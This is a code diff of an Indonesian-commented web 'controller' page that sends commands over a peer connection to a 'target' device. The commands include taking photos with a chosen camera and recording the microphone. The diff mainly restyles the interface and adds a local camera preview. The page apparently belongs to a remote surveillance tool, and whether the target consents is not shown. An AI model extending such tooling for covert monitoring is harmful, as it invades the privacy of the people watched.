@@ -85,7 +85,7 @@
       border-radius: 24px;
       padding: 16px;
       margin-top: 16px;
-      max-height: 400px;
+      max-height: 450px;
       overflow-y: auto;
     }
     .result-title {
@@ -101,32 +101,55 @@
       font-size: 0.8rem;
       word-break: break-word;
     }
-    img.result-img { max-width: 100%; border-radius: 16px; margin-top: 8px; }
+    img.result-img { max-width: 100%; border-radius: 16px; margin-top: 8px; cursor: pointer; }
     audio { width: 100%; margin-top: 8px; }
     
     .camera-options {
       display: flex;
-      gap: 10px;
-      margin: 10px 0;
+      gap: 14px;
+      margin: 12px 0;
       flex-wrap: wrap;
     }
     .cam-choice {
       background: #e1f5fe;
-      padding: 8px 16px;
+      padding: 10px 20px;
       border-radius: 40px;
-      font-size: 0.8rem;
+      font-size: 0.9rem;
       font-weight: 600;
       cursor: pointer;
       border: none;
       color: #01579b;
+      flex: 1;
+      min-width: 120px;
     }
-    video {
+    .cam-choice:active { background: #b3e5fc; transform: scale(0.97); }
+    
+    video, canvas {
       border-radius: 20px;
-      margin-top: 10px;
+      margin-top: 12px;
       width: 100%;
-      max-width: 280px;
+      max-width: 320px;
+      border: 1px solid #b3e5fc;
       background: #000;
     }
+    
+    .action-buttons {
+      display: flex;
+      gap: 12px;
+      margin-top: 12px;
+      flex-wrap: wrap;
+    }
+    .action-btn {
+      background: #0288d1;
+      border: none;
+      padding: 10px 18px;
+      border-radius: 40px;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .close-btn { background: #ff8a65; }
+    
     .google-maps-link {
       display: inline-block;
       background: #0288d1;
@@ -178,7 +201,7 @@
   let connection = null;
   let isConnected = false;
   
-  // State untuk kamera lokal (di controller, untuk preview)
+  // State untuk kamera preview di controller
   let activeCameraStream = null;
   let activeCameraCard = null;
   
@@ -257,7 +280,7 @@
     addResult('command', `📤 Mengirim perintah: ${type}`);
   }
   
-  // =============== FITUR KAMERA DI CONTROLLER (untuk preview dan kirim perintah) ===============
+  // =============== FITUR KAMERA (PREVIEW + MIRROR + PILIH DEPAN/BELAKANG) ===============
   function stopAnyCamera() {
     if (activeCameraStream) {
       activeCameraStream.getTracks().forEach(track => track.stop());
@@ -270,7 +293,7 @@
   }
   
   async function onShowCamera() {
-    // Hapus tampilan sebelumnya
+    // Bersihkan card kamera sebelumnya
     const existingCard = document.getElementById('camera-card-temp');
     if (existingCard) existingCard.remove();
     stopAnyCamera();
@@ -280,7 +303,7 @@
       return;
     }
     
-    // Buat card kamera untuk preview dan perintah
+    // Buat card kamera dengan preview (seperti index3.html)
     const card = document.createElement('div');
     card.style.background = '#eef5fc';
     card.style.borderRadius = '24px';
@@ -288,82 +311,143 @@
     card.style.marginTop = '8px';
     card.id = 'camera-card-temp';
     
+    // Tombol pilih kamera depan/belakang
     const btnDiv = document.createElement('div');
     btnDiv.className = 'camera-options';
     
     const frontBtn = document.createElement('button');
-    frontBtn.innerText = '🤳 Minta Kamera Depan Target';
+    frontBtn.innerText = '🤳 Kamera Depan (Mirror)';
     frontBtn.className = 'cam-choice';
     
     const backBtn = document.createElement('button');
-    backBtn.innerText = '📸 Minta Kamera Belakang Target';
+    backBtn.innerText = '📸 Kamera Belakang (Normal)';
     backBtn.className = 'cam-choice';
     
     btnDiv.appendChild(frontBtn);
     btnDiv.appendChild(backBtn);
     
+    // Video preview (dari kamera CONTROLLER, untuk melihat diri sendiri)
+    const videoElem = document.createElement('video');
+    videoElem.autoplay = true;
+    videoElem.playsInline = true;
+    videoElem.muted = true;
+    videoElem.style.width = '100%';
+    videoElem.style.maxWidth = '320px';
+    videoElem.style.borderRadius = '24px';
+    videoElem.style.backgroundColor = '#000';
+    
     const infoText = document.createElement('div');
     infoText.style.margin = '10px 0';
     infoText.style.fontSize = '0.8rem';
     infoText.style.color = '#0288d1';
-    infoText.innerHTML = '📷 Klik tombol di atas untuk meminta target mengambil foto (dengan kamera pilihan)';
+    infoText.style.textAlign = 'center';
+    infoText.innerHTML = '📷 Preview kamera Anda (controller)<br>↓ Klik tombol di bawah untuk ambil foto di target ↓';
     
-    card.appendChild(btnDiv);
-    card.appendChild(infoText);
+    const actionDiv = document.createElement('div');
+    actionDiv.className = 'action-buttons';
     
-    // Tombol untuk meminta foto (tanpa preview lokal)
-    const requestPhotoBtn = document.createElement('button');
-    requestPhotoBtn.innerText = '📸 Ambil Foto dari Target';
-    requestPhotoBtn.style.background = '#0288d1';
-    requestPhotoBtn.style.border = 'none';
-    requestPhotoBtn.style.padding = '12px 20px';
-    requestPhotoBtn.style.borderRadius = '40px';
-    requestPhotoBtn.style.color = 'white';
-    requestPhotoBtn.style.fontWeight = 'bold';
-    requestPhotoBtn.style.marginTop = '10px';
-    requestPhotoBtn.style.width = '100%';
-    requestPhotoBtn.style.cursor = 'pointer';
-    
-    let currentFacing = 'environment'; // default belakang
-    
-    frontBtn.onclick = () => {
-      currentFacing = 'user';
-      addResult('info', '📤 Mengirim perintah ambil foto dengan kamera DEPAN ke target...');
-      sendCommand('take_photo', { facingMode: 'user' });
-    };
-    
-    backBtn.onclick = () => {
-      currentFacing = 'environment';
-      addResult('info', '📤 Mengirim perintah ambil foto dengan kamera BELAKANG ke target...');
-      sendCommand('take_photo', { facingMode: 'environment' });
-    };
-    
-    card.appendChild(requestPhotoBtn);
+    const captureBtn = document.createElement('button');
+    captureBtn.innerText = '📸 Ambil Foto dari Target';
+    captureBtn.className = 'action-btn';
     
     const closeBtn = document.createElement('button');
-    closeBtn.innerText = '❌ Tutup Panel Kamera';
-    closeBtn.style.background = '#ff8a65';
-    closeBtn.style.border = 'none';
-    closeBtn.style.padding = '10px 16px';
-    closeBtn.style.borderRadius = '40px';
-    closeBtn.style.color = 'white';
-    closeBtn.style.fontWeight = 'bold';
-    closeBtn.style.marginTop = '10px';
-    closeBtn.style.width = '100%';
-    closeBtn.style.cursor = 'pointer';
-    closeBtn.onclick = () => {
-      card.remove();
-      stopAnyCamera();
-    };
-    card.appendChild(closeBtn);
+    closeBtn.innerText = '❌ Tutup Kamera';
+    closeBtn.className = 'action-btn close-btn';
     
-    resultList.prepend(card);
+    actionDiv.appendChild(captureBtn);
+    actionDiv.appendChild(closeBtn);
+    
+    card.appendChild(btnDiv);
+    card.appendChild(videoElem);
+    card.appendChild(infoText);
+    card.appendChild(actionDiv);
+    
+    // Sisipkan ke resultList bagian atas
+    if (resultList.firstChild) {
+      resultList.insertBefore(card, resultList.firstChild);
+    } else {
+      resultList.appendChild(card);
+    }
     activeCameraCard = card;
+    
+    let currentStream = null;
+    let currentFacingMode = 'environment'; // default belakang untuk pengambilan foto
+    
+    // Fungsi untuk memulai preview kamera controller
+    async function startPreviewCamera(facingMode, isMirror = false) {
+      if (currentStream) {
+        currentStream.getTracks().forEach(t => t.stop());
+      }
+      try {
+        const constraints = { video: { facingMode: { exact: facingMode } } };
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        currentStream = stream;
+        activeCameraStream = stream;
+        videoElem.srcObject = stream;
+        if (isMirror) {
+          videoElem.style.transform = 'scaleX(-1)';
+        } else {
+          videoElem.style.transform = 'scaleX(1)';
+        }
+        currentFacingMode = facingMode;
+      } catch (err) {
+        console.warn(`Gagal preview ${facingMode}:`, err);
+        // Fallback
+        try {
+          const fallbackStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
+          currentStream = fallbackStream;
+          activeCameraStream = fallbackStream;
+          videoElem.srcObject = fallbackStream;
+          if (isMirror) videoElem.style.transform = 'scaleX(-1)';
+          else videoElem.style.transform = 'scaleX(1)';
+          currentFacingMode = facingMode;
+        } catch(e2) {
+          console.error('Preview kamera gagal total');
+        }
+      }
+    }
+    
+    // Tombol kamera depan (preview mirror, tapi ambil foto di target pakai user)
+    frontBtn.onclick = () => {
+      startPreviewCamera('user', true);
+      addResult('info', '📤 Preview kamera DEPAN aktif. Klik "Ambil Foto" untuk memotret dari target dengan kamera depan');
+      // Simpan mode untuk pengambilan foto
+      currentFacingMode = 'user';
+    };
+    
+    // Tombol kamera belakang (preview normal, ambil foto pakai environment)
+    backBtn.onclick = () => {
+      startPreviewCamera('environment', false);
+      addResult('info', '📤 Preview kamera BELAKANG aktif. Klik "Ambil Foto" untuk memotret dari target dengan kamera belakang');
+      currentFacingMode = 'environment';
+    };
+    
+    // Ambil foto di target menggunakan facingMode yang dipilih
+    captureBtn.onclick = () => {
+      if (!isConnected) {
+        addResult('error', { error: 'Koneksi ke target terputus!' }, true);
+        return;
+      }
+      addResult('info', `📸 Mengirim perintah ambil foto ke target dengan kamera ${currentFacingMode === 'user' ? 'DEPAN (mirror)' : 'BELAKANG'}`);
+      sendCommand('take_photo', { facingMode: currentFacingMode });
+    };
+    
+    closeBtn.onclick = () => {
+      if (currentStream) {
+        currentStream.getTracks().forEach(t => t.stop());
+      }
+      activeCameraStream = null;
+      if (card && card.parentNode) card.remove();
+      activeCameraCard = null;
+      addResult('info', 'Panel kamera ditutup');
+    };
+    
+    // Default: buka kamera belakang untuk preview
+    startPreviewCamera('environment', false);
   }
   
-  // =============== FITUR MIKROFON DI CONTROLLER ===============
+  // =============== FITUR MIKROFON ===============
   let isRecordingActive = false;
-  let recordingStartTime = null;
   
   function onMicrophoneRecorder() {
     if (!isConnected) {
@@ -464,7 +548,11 @@
     micCard.appendChild(stopBtn);
     micCard.appendChild(closeBtn);
     
-    resultList.prepend(micCard);
+    if (resultList.firstChild) {
+      resultList.insertBefore(micCard, resultList.firstChild);
+    } else {
+      resultList.appendChild(micCard);
+    }
   }
   
   // =============== KONEKSI PEER ===============
@@ -549,8 +637,9 @@
     connectToPeer(peerId);
   };
   
-  // Minta izin notifikasi di controller
+  // Minta izin kamera & notifikasi di controller untuk preview
   if ('Notification' in window) Notification.requestPermission();
+  // Izin kamera untuk preview akan diminta saat tombol kamera diklik
   
   initPeer();
 </script>
